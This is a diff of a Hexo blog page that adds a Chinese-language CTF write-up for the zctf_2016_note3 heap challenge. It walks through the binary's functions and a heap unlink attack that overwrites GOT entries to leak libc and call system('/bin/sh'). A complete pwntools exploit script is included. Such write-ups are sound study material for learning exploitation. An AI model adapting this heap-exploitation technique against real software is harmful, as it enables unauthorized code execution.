@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | Hexo</title>
+  <title>Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
+    
+    <!-- <meta name="keywords" content="">
+    <meta name="description" content=""> -->
+  
   <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/index.html">
+<meta property="og:url" content="http://example.com/page/3/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
@@ -200,353 +204,88 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
   
-  
+    <article id="post-zctf_2016_note3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h4 id="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"><a href="#这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。" class="headerlink" title="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"></a>这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。</h4><h4 id="先看add函数"><a href="#先看add函数" class="headerlink" title="先看add函数"></a>先看add函数</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAZ7T.png" alt="image-20231014214742855"></p>
+<h4 id="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去"><a href="#第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去" class="headerlink" title="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去"></a>第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFTgo.png" alt="image-20231012210324374"></p>
+<h4 id="sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。"><a href="#sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。" class="headerlink" title="sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3&#x3D;10其实就是截止符’\xa’，后面两条已经不重要了。"></a>sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3&#x3D;10其实就是截止符’\xa’，后面两条已经不重要了。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFEWD.png" alt="image-20231012210438919"></p>
+<h4 id="最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"><a href="#最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size" class="headerlink" title="最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"></a>最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFqNA.png" alt="image-20231012211843683"></p>
+<h4 id="edit函数，先看第16行的read函数，第一个参数-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"><a href="#edit函数，先看第16行的read函数，第一个参数-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。" class="headerlink" title="edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"></a>edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFGp5.png" alt="image-20231012212200515"></p>
+<h4 id="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"><a href="#dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞" class="headerlink" title="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"></a>dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFN7s.png" alt="image-20231012212926978"></p>
+<h4 id="重点的地方在这，就是unlink的怎么构造。"><a href="#重点的地方在这，就是unlink的怎么构造。" class="headerlink" title="重点的地方在这，就是unlink的怎么构造。"></a>重点的地方在这，就是unlink的怎么构造。</h4><h4 id="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并"><a href="#先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并" class="headerlink" title="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd&#x3D;ptr-0x18和bk&#x3D;ptr-0x10，后期会进行和并"></a>先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd&#x3D;ptr-0x18和bk&#x3D;ptr-0x10，后期会进行和并</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1) <span class="comment">#堆0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;bbbb&#x27;</span>)      <span class="comment">#堆1</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;CCCC&#x27;</span>)   <span class="comment">#堆2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)   <span class="comment">#堆3 </span></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"><a href="#关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2" class="headerlink" title="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"></a>关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*2+p64(0xb0)+p64(0xa0)</span><br><span class="line"></span><br><span class="line">add(0,payload2)</span><br></pre></td></tr></table></figure>
+
+<h4 id="覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用"><a href="#覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用" class="headerlink" title="覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用"></a>覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFaDX.png" alt="image-20231014153740961.png"></p>
+<h4 id="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。"><a href="#当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。" class="headerlink" title="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。"></a>当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。</h4><p><img src="/zctf_2016_note3.assets/AJTB31Sv6tYn9Vu.png" alt="image-20231014161643622.png"></p>
+<h4 id="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"><a href="#当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。" class="headerlink" title="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"></a>当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFyAU.png" alt="image-20231014162533011.png"></p>
+<h4 id="而在dele-2-后"><a href="#而在dele-2-后" class="headerlink" title="而在dele(2)后"></a>而在dele(2)后</h4><h4 id="存放堆2的指针被置零了"><a href="#存放堆2的指针被置零了" class="headerlink" title="存放堆2的指针被置零了"></a>存放堆2的指针被置零了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rACx0.png" alt="image-20231014163605611.png"></p>
+<h4 id="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"><a href="#这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了" class="headerlink" title="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"></a>这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAPjC.png" alt="image-20231014163850174.png"></p>
+<h4 id="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"><a href="#0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放" class="headerlink" title="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"></a>0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放</h4><h4 id="之后的bin是这样的"><a href="#之后的bin是这样的" class="headerlink" title="之后的bin是这样的"></a>之后的bin是这样的</h4><p><img src="/zctf_2016_note3.assets/x8DgM9LaTris3oF.png" alt="image-20231014164403504.png"></p>
+<h4 id="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"><a href="#然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写" class="headerlink" title="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"></a>然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgs.ovh/2023/10/14/rALVt.png" alt="image-20231014164701954.png"></p>
+<h4 id="再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt"><a href="#再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt" class="headerlink" title="再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt"></a>再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgs.ovh/2023/10/14/rAXkm.png" alt="image-20231014165150300"></p>
+<h4 id="这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移"><a href="#这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移" class="headerlink" title="这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移"></a>这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;atoi_addr = &#x27;</span> + <span class="built_in">hex</span>(atoi_addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgs.ovh/2023/10/14/rArgN.png" alt="image-20231014165713253"></p>
+<h4 id="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。"><a href="#然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。" class="headerlink" title="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘&#x2F;bin&#x2F;sh’就可以提权了。"></a>然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘&#x2F;bin&#x2F;sh’就可以提权了。</h4><h4 id="最后的exp"><a href="#最后的exp" class="headerlink" title="最后的exp"></a>最后的exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./zctf_2016_note3&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./zctf_2016_note3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the length of the note content:(less than 1024)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the note content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,payload2) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#he bing</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)  <span class="comment">#dele di 0 ge dui </span></span><br><span class="line"></span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;atoi_addr = &#x27;</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base=atoi_addr-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
     
     
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/mergeheap/" class="archive-article-date">
-        <time datetime="2024-03-08T12:47:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
 
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/mergeheap/" target="_blank">mergeheap</a>
-  
-    </h1>
-  
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/10/14/zctf_2016_note3/">展开全文 >></a>
+    </p>
+    
 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/bbctf-2020-write/" class="archive-article-date">
-        <time datetime="2024-03-08T11:12:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/bbctf-2020-write/" target="_blank">bbctf_2020_write</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/08/ciscn-2019-c-5/" class="archive-article-date">
-        <time datetime="2024-03-08T04:49:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/08/ciscn-2019-c-5/" target="_blank">ciscn_2019_c_5</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/06/starctf-2019-girlfriend/" class="archive-article-date">
-        <time datetime="2024-03-06T13:48:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-06</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/06/starctf-2019-girlfriend/" target="_blank">starctf_2019_girlfriend</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/05/ACTF-2019-message/" class="archive-article-date">
-        <time datetime="2024-03-05T11:24:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-05</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/05/ACTF-2019-message/" target="_blank">ACTF_2019_message</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/02/ACTF-2019-OneRepeater/" class="archive-article-date">
-        <time datetime="2024-03-02T08:13:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-02</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/02/ACTF-2019-OneRepeater/" target="_blank">ACTF_2019_OneRepeater</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/02/29/checkin/" class="archive-article-date">
-        <time datetime="2024-02-29T06:36:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-02-29</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/02/29/checkin/" target="_blank">checkin</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/01/22/ciscn-2019-es-1/" class="archive-article-date">
-        <time datetime="2024-01-21T16:08:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-22</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/01/22/ciscn-2019-es-1/" target="_blank">ciscn_2019_es_1</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/01/14/lctf2016_pwn200/" class="archive-article-date">
-        <time datetime="2024-01-14T12:22:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-14</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/01/14/lctf2016_pwn200/" target="_blank">lctf2016_pwn200</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
